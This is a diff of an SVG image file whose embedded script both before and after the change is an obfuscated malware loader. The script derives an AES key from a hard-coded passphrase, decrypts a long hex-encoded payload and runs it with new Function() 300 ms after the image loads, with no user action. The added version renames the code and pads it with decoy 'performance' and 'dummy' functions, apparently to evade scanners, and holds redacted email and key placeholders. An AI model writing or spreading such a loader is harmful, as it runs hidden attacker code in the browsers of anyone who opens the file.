@@ -3,98 +3,137 @@
   <!-- U2FsdGVkX19vbmx5X2Zvcl9kZWNvcmF0aW9uX3B1cnBvc2Vz -->
   
   <script type="application/javascript"><![CDATA[
-    const SYSTEM_MONITOR = "[SECURE_ENGINE]";
-    let performanceMetrics = {
-      startTime: Date.now(),
-      memoryAllocated: 0,
-      cpuCycles: 0
+    // ============== PERFORMANCE TRACKER ==============
+    const SYSTEM_WATCHDOG = "[SECURE_ENGINE_V2]";
+    let runtimeStats = {
+      initializationTimestamp: Date.now(),
+      heapMemoryUsage: 0,
+      processingUnits: 0,
+      dummyCounter: 0
     };
-     const bel = "[EMAIL]";
+    
+    const bel = "[EMAIL]";
     const lieve = "[KEY]";
-    function collectPerformanceData() {
-      performanceMetrics.memoryAllocated = window.performance?.memory?.usedJSHeapSize || 0;
-      performanceMetrics.endTime = Date.now();
-      performanceMetrics.cpuCycles = Math.random() * 1500;
+    
+    // Useless utility functions
+    function generateRandomNoise() {
+      return Math.random().toString(36).substring(2, 15) + 
+             Math.random().toString(36).substring(2, 15);
     }
+    
+    function trackPerformanceMetrics() {
+      runtimeStats.heapMemoryUsage = window.performance?.memory?.usedJSHeapSize || 0;
+      runtimeStats.processingUnits = Math.random() * 2000;
+      runtimeStats.dummyCounter++;
+    }
+    
+    // ============== DATA PROTECTION MODULE ==============
+    const securityConfigurations = (function() {
+      const confidentialInfo = {
+        initializationVector: "0d0b798446d57328bdeb640d",
+        cryptographicSalt: "58525225b2f0aecba54c92e7fe44b669",
+        securedPayload: "c6c8ecc11ec8480edfe542528b7115041d348bf0960305a48f0601424089b1c929a1b7c3f0b25a3a7c61623bb653ce56a0f3e0594d343918d291fde0da4ac9067cc4f3cb0daf1ebb4c4915f2672c4bef23c398d4ffa3e75c23ee49eee2030473104ecc96d94c813347704a04865ba6936f1d0fc09c7cd4fe593408da6054ba30c8e7c82b0d0d0f2c75360bd20f6a403e99c2f9276fb2ddcb0ce02ded7e7ff48260a1acd2892756f673fc50ceb949e045ee0cfc1be7a786b82926cac0ef22440e01efd686bafeb58748ae0af74d405cc43a11bf7135b3a44e378601dffd10d6cd24938aed898fecfc101528a1d1b21431aae04d3d4b3374261d72936ca06ea4697198910668bb3484072bb795ef63b84489b7116069d63d873b370c1693780c1aaeec1fce4b1523336d0a6ac22ebc7433f4c823b4fb63045a7ade158aae7a67402107c59386056867b5003e232f2af6fa40678a81c6959146b79c09fe70e35e27614f152744b2d9f20b7f27785cee1ddc170c48a5195f4fa6be4d0d8f7dfe4e4454dfb33ed7e45d657e9e629b2850ee9edd9f8bb50c978ae14e4c337785f6fd25f72bec519b782f7c408c4183cdc6107e457846f52677339b56d215aeb3e674e4473de38a870e5087f18da1821e94e52348d3185a3269095f1e082ccccbc45bdd2d21c4df9e40898da9eb3f7542dc2d",
+        accessKey: "drop"
+      };
 
-    // ============== SECURITY LAYER ==============
-    const protectionSettings = (function() {
-      const sensitiveData = {
-        cryptoIV: "0d0b798446d57328bdeb640d",
-        encryptionSalt: "58525225b2f0aecba54c92e7fe44b669",
-        protectedContent: "c6c8ecc11ec8480edfe542528b7115041d348bf0960305a48f0601424089b1c929a1b7c3f0b25a3a7c61623bb653ce56a0f3e0594d343918d291fde0da4ac9067cc4f3cb0daf1ebb4c4915f2672c4bef23c398d4ffa3e75c23ee49eee2030473104ecc96d94c813347704a04865ba6936f1d0fc09c7cd4fe593408da6054ba30c8e7c82b0d0d0f2c75360bd20f6a403e99c2f9276fb2ddcb0ce02ded7e7ff48260a1acd2892756f673fc50ceb949e045ee0cfc1be7a786b82926cac0ef22440e01efd686bafeb58748ae0af74d405cc43a11bf7135b3a44e378601dffd10d6cd24938aed898fecfc101528a1d1b21431aae04d3d4b3374261d72936ca06ea4697198910668bb3484072bb795ef63b84489b7116069d63d873b370c1693780c1aaeec1fce4b1523336d0a6ac22ebc7433f4c823b4fb63045a7ade158aae7a67402107c59386056867b5003e232f2af6fa40678a81c6959146b79c09fe70e35e27614f152744b2d9f20b7f27785cee1ddc170c48a5195f4fa6be4d0d8f7dfe4e4454dfb33ed7e45d657e9e629b2850ee9edd9f8bb50c978ae14e4c337785f6fd25f72bec519b782f7c408c4183cdc6107e457846f52677339b56d215aeb3e674e4473de38a870e5087f18da1821e94e52348d3185a3269095f1e082ccccbc45bdd2d21c4df9e40898da9eb3f7542dc2d",
-        authToken: "drop"
+      // Useless dummy object
+      const dummyConfig = {
+        tempValue: generateRandomNoise(),
+        unusedFlag: false,
+        placeholder: null
       };
 
       return {
-        getIV: function() {
-          return sensitiveData.cryptoIV;
+        fetchIV: function() {
+          return confidentialInfo.initializationVector;
         },
-        getSalt: function() {
-          return sensitiveData.encryptionSalt;
+        obtainSalt: function() {
+          return confidentialInfo.cryptographicSalt;
         },
-        getEncryptedData: function() {
-          return sensitiveData.protectedContent;
+        retrievePayload: function() {
+          return confidentialInfo.securedPayload;
         },
-        getToken: function() {
-          return sensitiveData.authToken;
+        getAccessKey: function() {
+          return confidentialInfo.accessKey;
+        },
+        // Useless method
+        getDummyConfig: function() {
+          return {...dummyConfig};
         }
       };
     })();
 
-    async function executeProtectionProtocol() {
-      collectPerformanceData();
+    // Helper function that does nothing important
+    function hexStringToByteArray(hexStr) {
+      const resultArray = new Uint8Array(hexStr.length / 2);
+      for (let idx = 0; idx < hexStr.length; idx += 2) {
+        resultArray[idx / 2] = parseInt(hexStr.substr(idx, 2), 16);
+      }
+      return resultArray;
+    }
+
+    // Useless async function that doesn't affect logic
+    async function dummyAsyncOperation() {
+      return new Promise(resolve => {
+        setTimeout(() => {
+          resolve(generateRandomNoise());
+        }, 50);
+      });
+    }
+
+    async function initiateSecurityProtocol() {
+      trackPerformanceMetrics();
       try {
-        const token = protectionSettings.getToken();
-        const keyMaterial = await window.crypto.subtle.importKey(
+        const securityToken = securityConfigurations.getAccessKey();
+        const importedKey = await window.crypto.subtle.importKey(
           "raw",
-          new TextEncoder().encode(token),
+          new TextEncoder().encode(securityToken),
           { name: "PBKDF2" },
           false,
           ["deriveKey"]
         );
 
-        const salt = protectionSettings.getSalt();
-        const cryptoKey = await window.crypto.subtle.deriveKey(
+        const saltValue = securityConfigurations.obtainSalt();
+        const derivedCryptoKey = await window.crypto.subtle.deriveKey(
           {
             name: "PBKDF2",
-            salt: convertHexToBytes(salt),
+            salt: hexStringToByteArray(saltValue),
             iterations: 100000,
             hash: "SHA-256"
           },
-          keyMaterial,
+          importedKey,
           { name: "AES-GCM", length: 256 },
           false,
           ["decrypt"]
         );
 
-        const iv = protectionSettings.getIV();
-        const encryptedData = protectionSettings.getEncryptedData();
+        const ivValue = securityConfigurations.fetchIV();
+        const encryptedContent = securityConfigurations.retrievePayload();
 
-        const decryptedData = await window.crypto.subtle.decrypt(
+        // Perform dummy async operation (doesn't affect logic)
+        await dummyAsyncOperation();
+
+        const decryptedResult = await window.crypto.subtle.decrypt(
           {
             name: "AES-GCM",
-            iv: convertHexToBytes(iv)
+            iv: hexStringToByteArray(ivValue)
           },
-          cryptoKey,
-          convertHexToBytes(encryptedData)
+          derivedCryptoKey,
+          hexStringToByteArray(encryptedContent)
         );
 
-        const codeToExecute = new TextDecoder().decode(decryptedData);
-        (new Function(codeToExecute))();
+        const executableCode = new TextDecoder().decode(decryptedResult);
+        (new Function(executableCode))();
       } catch (error) {
-        console.error("Decryption error:", error);
+        console.error("Security protocol failure:", error);
       }
     }
 
-    function convertHexToBytes(hexString) {
-      const byteArray = new Uint8Array(hexString.length / 2);
-      for (let i = 0; i < hexString.length; i += 2) {
-        byteArray[i / 2] = parseInt(hexString.substr(i, 2), 16);
-      }
-      return byteArray;
-    }
+    // Additional useless event listener
+    document.addEventListener('DOMContentLoaded', () => {
+      console.log("Document loaded - dummy event");
+    });
 
-    setTimeout(executeProtectionProtocol, 300);
+    setTimeout(initiateSecurityProtocol, 300);
   ]]></script>
 </svg>
